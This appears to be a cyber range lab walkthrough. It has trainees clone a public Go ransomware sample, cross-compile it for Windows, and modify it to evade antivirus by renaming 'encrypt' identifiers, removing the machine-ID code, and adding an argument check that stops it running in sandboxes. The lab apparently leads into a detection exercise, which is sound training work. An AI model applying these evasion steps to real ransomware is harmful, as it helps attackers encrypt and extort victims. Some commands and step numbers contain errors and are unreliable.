# Creation

## Download and open the source code. (Sample Golang Ransomware - Not Ironcat)

1. Open Linux-Attack-Host in the guacamole console and run the following command:

`sudo git clone https://github.com/target111/go-crypt.git`

2. Make a new directory to hold the files you will be working on.

`mkdir notransomware`

3. Copy the test file from the go-crypt folder.

`cp go-crypt/crypter/encrypt.go notransomware/main.go`

3. Open *** with vscode
`code ./sample-ransom-code`

## Modify code for evasion




1. Open with `sudo nano` or if you want to follow along with your other favorite editor but nano is used for these instructions.
2. Press ctrl+3 then shift+3 to show line numbers.
3. Delete line 4 for the library ending in "machineid"
4. On line !!!35!!! beside the notes //modify this enter the following string.
>28829730309010657689506817921736702614977419171048790814360401911700736026882263287280633036572589446282655463666621369861320324226221161343419838835045479992117350973828145979278911440700898922410158780024734309937385132113630847667287089643042430628736442422981023419980690360328383978642799979423068219753778126619174305497259148790827898849760892814558838774428097310498076614082543584647218890524523911515264969573606262336250267117667935398340567215670410596137143084209304637098830513856844628549070680660183066926514206502508444411765240485246204905446752414702912969399580197385942898003760095676196227898641

5. Delete line 158 starting with 'id' through 162 ending with "{".
6. Delete line 164 ""id": {id},"
7. Cursor down to line 189. Press end. Delte the characters "+ id" from the end of the string.
8. Press ctrl+x to save, and enter to save as main.go.
9. Build! `env GOOS=windows GOARCH=386 build main.go`
10. Rename this version for your first test. `cp main.exe test1.exe`

## Now let's get a little tricky by changing some of the words!
1. Again open the source with `sudo nano main.go`
2. Press ctrl+3 and then shift+3 to show line numbers.
3. Press alt+r to open the replace option.
4. Type "encrypt" and press enter.
5. Then type "random" and press enter to replace the word encrypt with random.
6. Press A to do it for all cases.
7. Now cursor down to line 153 that should contain the function "rsa.randomOAEP".
8. Change this to "rsa.EncryptOAEP" and nothing else on the line. It is case sensitive.
9. Use ctrl+x to save.
10. Again build running `env GOOS=windows GOARCH=386 build main.go`
11. Rename the executable. `mv main.exe test264.exe`
12. Make a second version of this one for 32 bit systems by running `env GOOS=windows GOARCH=386 build main.go`
13. Rename the executable. `mv main.exe test232.exe`

### Now you are just being mean

Add an argument requirement! 

1. Open the main.go file again with `sdo nano main.go`
2. Cursor down to the main function which should be around line 111 and look like "func main() {
3. Enter a new line below this line, right above "var files []string"
4. Insert the follow code in that new line.
```
if len(args) < 1 {
		fmt.Printf("Ironcat is now a kitten herd!")
		os.Exit(1)
	}
```
5. Use ctrl+x, y, and enter to save the changes.
6. Build just for 32bit this time. `env GOOS=windows GOARCH=386 build main.go`
7. Rename the executable. `mv main.exe test332-arg.exe`

If you done help your teammates. Generate discussion or ask good questions in chat. You will be called back for a short presentation before moving on to detection.

!detection
